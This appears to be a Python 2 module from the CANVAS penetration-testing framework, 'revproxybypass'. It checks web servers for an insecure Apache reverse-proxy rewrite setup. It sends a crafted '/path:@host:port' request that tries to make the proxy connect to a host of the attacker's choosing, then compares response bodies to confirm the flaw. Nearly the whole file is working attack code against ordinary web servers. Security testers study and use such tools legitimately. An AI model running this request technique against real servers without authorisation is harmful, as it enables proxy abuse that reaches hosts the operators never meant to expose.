#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import socket
import httplib
import difflib
from exploitutils import *

from canvasexploit import canvasexploit
from contextlib import contextmanager

NAME                           = "revproxybypass"
DESCRIPTION                    = "Scan HTTP server for vulnerable reverse proxy setup"
DOCUMENTATION                  = {}
DOCUMENTATION["Notes"]         = """

This tool will scan an HTTP server for vulnerable reverse proxy setup.
This is done by first doing a reference HTTP request to the server itself
(or another web server given as reference in the configuration dialog)
and saving the reply body.

Then, a specially crafted HTTP request is made to the target server
that attempts to take advantage of insecure rewrite rules in the case
of Apache, and make the reverse proxy connect to a domain of our
choice (could be same as target or a different, reference domain).

The body of the final HTTP reply is compared to the body of the reference
reply in a fuzzy way and the vulnerability is verified if they match.

"""

DOCUMENTATION['References']    = 'http://www.contextis.com/research/blog/reverseproxybypass/'
DOCUMENTATION['Repeatability'] = 'Infinite'
VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Recon"
PROPERTY['SITE']               = "Remote"
TIMEOUT                        = 10
SUCCESS_RATIO                  = 0.9

@contextmanager
def no_timeout_socket():
    old           = socket.socket
    socket.socket = socket._no_timeoutsocket
    try:
        yield
    finally:
        socket.socket = old

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name      = NAME
        self.ssl       = 0
        self.port      = 80
        self.vhost     = ""
        self.basepath  = "/"
        self.reference = ""
        
    def getArgs(self):
        self.getarg("vhost")
        self.getarg("port")
        self.getarg("ssl")
        self.getarg("basepath")
        self.getarg("reference")


        if self.basepath == "/": self.basepath = ""
        if self.basepath.startswith("/"): self.basepath = self.basepath[1:]

    def grab_reference(self):
        with no_timeout_socket():
            try:
                self.log('Grabbing reference body..')
                if self.reference in ("", "localhost", "127.0.0.1"):
                    if self.ssl:
                        self.log("Connecting to https://%s:%d" % (self.vhost, self.port))
                        connection = httplib.HTTPSConnection(self.vhost, self.port, timeout=TIMEOUT)
                    else:
                        self.log('Connecting to http://%s:%d' % (self.vhost, self.port))
                        connection = httplib.HTTPConnection(self.vhost, self.port, timeout=TIMEOUT)
                else:
                    self.log('Connecting to http://%s:80' % self.reference)
                    connection = httplib.HTTPConnection(self.reference, timeout=TIMEOUT)
                    
                connection.request('GET', '/')
                resp = connection.getresponse()
                if resp.status != 200:
                    self.log('Reference status %d %s != 200, try with a different reference host..' % (resp.status, resp.reason))
                    self.setProgress(100)
                    connection.close()
                    return False

                body = resp.read()
                connection.close()
                return body
            except Exception, ex:
                self.log('Exception: %s' % ex)
                return False

    def usage(self):
        print "Usage: %s -t target [-O ssl:0] [-O port:80] [-O vhost:] [-O basepath:/] [-O reference:]\n" % sys.argv[0]
        print "\t+vhost can be a virtual host string, if none is given target will be used"
        print "\t+basepath should be the URL path to the needed resource (/ by default)"
        print "\t+reference can be a host that will be used to verify the vulnerability"
        print "\t if none is given, target will be used\n"

    def run(self):
        self.setInfo("%s" % NAME)
        self.getArgs()

        if not self.vhost: self.vhost = self.target.resolved_from
        
        # First request to get reference server body
        ref_body = self.grab_reference()
        if not ref_body: return 0

        with no_timeout_socket():
            try:
                # Second request to verify vulnerability
                self.log('Verifying vulnerability..')
                if self.ssl:
                    self.log('Connecting to https://%s:%d/%s' % (self.vhost, self.port, self.basepath))
                    connection = httplib.HTTPSConnection(self.vhost, self.port, timeout=TIMEOUT)
                else:
                    self.log('Connecting to http://%s:%d/%s' % (self.vhost, self.port, self.basepath))
                    connection = httplib.HTTPConnection(self.vhost, self.port, timeout=TIMEOUT)

                        
                attack_string = ':@%s:%d' % (self.vhost if self.reference in ("", "localhost", "127.0.0.1") else self.reference,
                                             self.port if self.reference in ("", "localhost", "127.0.0.1") else 80)
                if self.basepath: attack_string = "/%s%s" % (self.basepath, attack_string)
                self.log('Attack string: %s' % attack_string)
                connection.request('GET', attack_string)
                resp = connection.getresponse()

                if resp.status != 200:
                    self.log('HTTP status %d %s != 200, verification failed..' % (resp.status, resp.reason))
                    self.setProgress(100)
                    connection.close()
                    return 0

                body = resp.read()
                connection.close()
            
                if difflib.SequenceMatcher(None, ref_body, body).ratio() >= SUCCESS_RATIO:
                    self.log('Server %s:%d has a vulnerable reverse proxy setup!' % (self.vhost, self.port))
                    self.setProgress(100)
                    return 1
                else:
                    self.log('Server %s:%d does not seem to have a vulnerable reverse proxy setup!' % (self.vhost, self.port))
                    self.setProgress(100)
                    return 0
            except Exception, ex:
                self.log('Exception: %s' % ex)
                self.setProgress(100)
                return 0
        
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
